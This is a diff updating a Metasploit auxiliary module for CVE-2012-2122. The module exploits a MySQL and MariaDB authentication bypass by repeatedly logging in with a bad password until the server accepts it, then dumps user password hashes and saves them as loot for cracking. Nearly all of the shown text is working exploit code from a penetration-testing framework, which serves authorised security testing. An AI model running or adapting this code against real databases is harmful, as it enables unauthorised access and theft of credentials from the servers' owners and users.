@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::MYSQL
   include Msf::Auxiliary::Report
 
@@ -16,18 +13,29 @@ class Metasploit3 < Msf::Auxiliary
     super(
       'Name'           => 'MySQL Authentication Bypass Password Dump',
       'Description'    => %Q{
-          This module exploits a password bypass vulnerability in MySQL in order
+        This module exploits a password bypass vulnerability in MySQL in order
         to extract the usernames and encrypted password hashes from a MySQL server.
-        These hashes ares stored as loot for later cracking.
+        These hashes are stored as loot for later cracking.
+
+        Impacts MySQL versions:
+        - 5.1.x before 5.1.63
+        - 5.5.x before 5.5.24
+        - 5.6.x before 5.6.6
+
+        And MariaDB versions:
+        - 5.1.x before 5.1.62
+        - 5.2.x before 5.2.12
+        - 5.3.x before 5.3.6
+        - 5.5.x before 5.5.23
       },
       'Author'        => [
           'theLightCosine', # Original hashdump module
-          'jcran'                                              # Authentication bypass bruteforce implementation
+          'jcran' # Authentication bypass bruteforce implementation
         ],
       'References'     => [
           ['CVE', '2012-2122'],
           ['OSVDB', '82804'],
-          ['URL', 'https://community.rapid7.com/community/metasploit/blog/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql']
+          ['URL', 'https://www.rapid7.com/blog/post/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql/']
         ],
       'DisclosureDate' => 'Jun 09 2012',
       'License'        => MSF_LICENSE
@@ -36,7 +44,7 @@ class Metasploit3 < Msf::Auxiliary
     deregister_options('PASSWORD')
     register_options( [
       OptString.new('USERNAME', [ true, 'The username to authenticate as', "root" ])
-    ], self.class )
+    ])
   end
 
 
@@ -53,19 +61,10 @@ class Metasploit3 < Msf::Auxiliary
 
     begin
       socket = connect(false)
-      x = ::RbMysql.connect({
-        :host           => rhost,
-        :port           => rport,
-        :user           => username,
-        :password       => password,
-        :read_timeout   => 300,
-        :write_timeout  => 300,
-        :socket         => socket
-        })
-      x.connect
-      results << x
+      mysql_client = ::RbMysql.connect(rhost, username, password, nil, rport, socket)
+      results << mysql_client
 
-      print_good "#{rhost}:#{rport} The server accepted our first login as #{username} with a bad password"
+      print_good "#{rhost}:#{rport} The server accepted our first login as #{username} with a bad password. URI: mysql://#{username}:#{password}@#{rhost}:#{rport}"
 
     rescue RbMysql::HostNotPrivileged
       print_error "#{rhost}:#{rport} Unable to login from this host due to policy (may still be vulnerable)"
@@ -114,26 +113,17 @@ class Metasploit3 < Msf::Auxiliary
           begin
             # Create our socket and make the connection
             s = connect(false)
-            x = ::RbMysql.connect({
-              :host           => rhost,
-              :port           => rport,
-              :user           => username,
-              :password       => password,
-              :read_timeout   => 300,
-              :write_timeout  => 300,
-              :socket         => s,
-              :db             => nil
-              })
-            print_status "#{rhost}:#{rport} Successfully bypassed authentication after #{count} attempts. URI: mysql://#{username}:#{password}@#{rhost}:#{rport}"
-            results << x
+            mysql_client = ::RbMysql.connect(rhost, username, password, nil, rport, s)
+
+            print_good "#{rhost}:#{rport} Successfully bypassed authentication after #{count} attempts. URI: mysql://#{username}:#{password}@#{rhost}:#{rport}"
+            results << mysql_client
           rescue RbMysql::AccessDeniedError
-          rescue Exception => e
-            print_status "#{rhost}:#{rport} Thread #{count}] caught an unhandled exception: #{e}"
+          rescue ::Exception => e
+            print_bad "#{rhost}:#{rport} Thread #{count}] caught an unhandled exception: #{e}"
           end
         end
 
         cur_threads << t
-
       end
 
       # We can stop if we get a valid login
@@ -177,7 +167,7 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     # Create a table to store data
-    tbl = Rex::Ui::Text::Table.new(
+    tbl = Rex::Text::Table.new(
       'Header'  => 'MysQL Server Hashes',
       'Indent'   => 1,
       'Columns' => ['Username', 'Hash']
@@ -209,8 +199,7 @@ class Metasploit3 < Msf::Auxiliary
   def report_hashes(hash_loot,service)
     filename= "#{rhost}-#{rport}_mysqlhashes.txt"
     path = store_loot("mysql.hashes", "text/plain", rhost, hash_loot, filename, "MySQL Hashes", service)
-    print_status("#{rhost}:#{rport} Hash Table has been saved: #{path}")
+    print_good("#{rhost}:#{rport} Hash Table has been saved: #{path}")
 
   end
-
 end
